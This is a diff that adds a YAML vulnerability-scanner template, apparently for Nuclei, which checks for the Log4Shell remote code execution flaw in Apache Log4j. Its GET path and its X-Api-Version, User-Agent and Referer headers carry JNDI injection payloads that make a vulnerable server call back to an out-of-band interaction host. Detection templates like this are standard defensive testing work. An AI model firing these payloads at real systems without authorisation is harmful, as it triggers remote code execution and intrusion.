@@ -1,0 +1,18 @@
+id: K70n0s510-log4shell
+info:
+  name: Apache Log4j RCE (Log4Shell)
+  author: K70n0s510
+  severity: critical
+  description: Fuzzes headers and params for JNDI injection.
+  tags: rce,log4j,jndi,oob
+http:
+  - method: GET
+    path: ["{{BaseURL}}/?x=${jndi:ldap://{{interactsh-url}}/a}"]
+    headers:
+      X-Api-Version: "${jndi:ldap://{{interactsh-url}}/a}"
+      User-Agent: "${jndi:ldap://{{interactsh-url}}/a}"
+      Referer: "${jndi:ldap://{{interactsh-url}}/a}"
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words: ["dns", "http", "ldap"]
